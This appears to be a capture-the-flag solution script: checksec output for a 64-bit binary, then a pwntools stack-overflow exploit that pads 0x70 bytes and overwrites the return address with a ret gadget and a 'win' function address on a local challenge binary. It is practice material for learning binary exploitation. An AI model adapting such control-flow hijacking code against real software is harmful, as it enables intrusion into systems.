
'''
 Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    '''
from pwn import *
ret_gadjet = 0x40101a # by ROBgadjet --binary
win_addr = 0x402087   # by objdump -d
offset = 0x70
payload = b'A' * offset + p64(ret_gadjet) + p64(win_addr)


r = process('/challenge/binary-exploitation-control-hijack')

r.send(payload)
r.interactive()